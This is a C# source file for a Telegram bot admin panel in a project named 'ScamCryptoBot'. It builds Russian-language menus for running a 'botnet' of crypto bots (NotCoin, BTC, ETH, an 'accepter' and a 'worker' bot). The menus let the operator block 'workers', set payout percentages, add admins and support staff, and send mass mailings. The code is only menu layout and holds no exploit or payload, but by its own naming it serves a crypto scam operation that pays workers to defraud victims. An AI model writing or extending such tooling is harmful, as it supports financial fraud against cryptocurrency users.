using ScamCryptoBot.notcoin;
using Telegram.Bot.Types.ReplyMarkups;
namespace ScamCryptoBot
{
    internal class MainKeyBoard
    {
        public static InlineKeyboardMarkup MainMenu()
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Конфигуратор⚙️","mbtn_configuration")
                    },
                    new InlineKeyboardButton[] 
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Администрирование⚙️","mbtn_admin_panel")
                    },
                    new InlineKeyboardButton [] 
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Управление ботами⚙️","mbtn_bots_panel")
                    },
                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData("❔Статус ботов❔","mbtb_status_botnet")
                    }

                } // mbtn_main_menu_back
                );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup ExitButton() 
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                 
                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData("⛔ Закрыть ⛔","mbtn_main_menu_back")
                    }

                } // mbtn_main_menu_back
                );
            return inlineKeyboard ;
        }
        public static InlineKeyboardMarkup AdminPanel() 
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Блокировать воркера⚙️","mbtn_main_block")
                    },
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Начать рассылку⚙️","mbtn_main_emailing")
                    },
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Бекаб БД⚙️","mbtn_main_backup_database")
                    },
                    // In last
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("📲Главное меню📲","mbtn_main_menu_back")
                    }
                    

                }
                );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup ConfigPanel() 
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Изменить выплату⚙️","mbtn_main_percent")
                    },
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Добавить админа⚙️","mbtn_main_add_admin")
                    },
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Добавить ТП⚙️","mbtn_main_add_tp")
                    },
                    // In last
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("📲Главное меню📲","mbtn_main_menu_back")
                    }


                }
                );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup BotsPanel() 
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️NotCoin⚙️","mbtn_notcoin")
                    },
                    new InlineKeyboardButton [] 
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️BTC⚙️","mbtn_btc")
                    },
                    new InlineKeyboardButton [] 
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️ETH⚙️","mbtn_eth")
                    },
                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData("⚙️Заявочник⚙️","mbtn_accepter")
                    },
                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData("⚙Воркер бот⚙","mbtn_worker_bot")
                    },
                    // In last
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("📲Главное меню📲","mbtn_main_menu_back")
                    }


                }
                );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup BotsPanelNotcoin() 
        {
            string status = "";
            if (LocalConfig.isNotcoinRun) status = "❌Остановить❌";
            else status = "✅Запуск✅";
            string to = "";
            if (notcoin.AdminPanel.adminFlagTO) to = "✅";
            else to = "❌";
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                    new InlineKeyboardButton []
                    {  
                        InlineKeyboardButton.WithCallbackData(status,"mbtn_bots_notcoin_status")
                    },
                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData($"Режим ТО [{to}]","mbtn_bots_notcoin_to")
                    },
                    // In last
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("📲Назад📲","mbtn_bots_notcoin_back")
                    }


                }
                ) ;
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup BotsPanelBTC()
        {
            string status = "";
            if (LocalConfig.isBTCEnable) status = "❌Остановить❌";
            else status = "✅Запуск✅";
            var inlineKeyboard = new InlineKeyboardMarkup(
               new List<InlineKeyboardButton[]>()
               {
                  new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData(status,"mbtn_bots_bts_status")
                    }
               }
               );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup BotsPanelAccepter()
        {
            string status = "";
            if (LocalConfig.isAccepterEnable) status = "❌Остановить❌";
            else status = "✅Запуск✅";
            var inlineKeyboard = new InlineKeyboardMarkup(
               new List<InlineKeyboardButton[]>()
               {
                  new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData(status,"mbtn_bots_accepter_status")
                    },
                  // In last
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("📲Назад📲","mbtn_bots_accepter_back")
                    }
               }
               );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup BotsPanelWorker()
        {
            string status = "";
            if (LocalConfig.isWorkerEnabled) status = "❌Остановить❌";
            else status = "✅Запуск✅";
            var inlineKeyboard = new InlineKeyboardMarkup(
               new List<InlineKeyboardButton[]>()
               {
                  new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData(status,"mbtn_bots_worker_status")
                    },
                  // In last
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("📲Назад📲","mbtn_bots_accepter_back")
                    }
               }
               );
            return inlineKeyboard;
        }
    }
}
